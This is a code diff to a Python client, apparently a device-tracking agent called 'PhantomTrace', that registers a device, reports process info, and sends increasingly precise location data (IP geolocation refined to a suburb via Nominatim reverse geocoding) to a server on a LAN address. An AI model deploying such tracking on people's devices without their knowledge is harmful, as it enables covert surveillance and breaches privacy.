@@ -10,7 +10,7 @@ import os
 import json
 
 CONFIG_FILE = os.path.join(os.path.dirname(__file__), 'device.json')
-BASE_URL = "http://127.0.0.1:5000"
+BASE_URL = "http://192.168.1.76:5000"
 
 def get_or_register_device():
     if os.path.exists(CONFIG_FILE):
@@ -80,17 +80,47 @@ def send_process_info():
 
 def send_location():
     try:
-        geo = requests.get("http://ip-api.com/json/", timeout=5).json()
+        geo = requests.get("http://ip-api.com/json/?fields=lat,lon,city,regionName,country,isp,query,zip,district", timeout=5).json()
+        lat = geo.get("lat")
+        lon = geo.get("lon")
+
+        # Get suburb/neighbourhood via Nominatim reverse geocoding
+        area = geo.get("district") or geo.get("regionName") or ""
+        try:
+            nom = requests.get(
+                f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json&addressdetails=1",
+                headers={"User-Agent": "PhantomTrace/1.0"},
+                timeout=5
+            ).json()
+            addr = nom.get("address", {})
+            # Pick the most specific area name available
+            area = (
+                addr.get("suburb") or
+                addr.get("neighbourhood") or
+                addr.get("quarter") or
+                addr.get("city_district") or
+                addr.get("district") or
+                addr.get("county") or
+                geo.get("regionName") or ""
+            )
+        except Exception as ne:
+            print(f"Nominatim fallback: {ne}")
+
+        city = geo.get("city", "")
+        country = geo.get("country", "")
+        full_area = f"{area}, {city}" if area and area != city else city
+
         r = requests.post(f"{BASE_URL}/api/device/location", json={
             "device_id": DEVICE_ID,
-            "latitude": geo.get("lat"),
-            "longitude": geo.get("lon"),
-            "city": geo.get("city"),
-            "country": geo.get("country"),
+            "latitude": lat,
+            "longitude": lon,
+            "city": city,
+            "country": country,
             "isp": geo.get("isp"),
-            "ip_address": geo.get("query")
+            "ip_address": geo.get("query"),
+            "area": full_area
         })
-        print(f"LOCATION sent: {r.status_code} — {geo.get('city')}, {geo.get('country')}")
+        print(f"LOCATION sent: {r.status_code} — {full_area}, {country}")
     except Exception as e:
         print(f"location error: {e}")
 
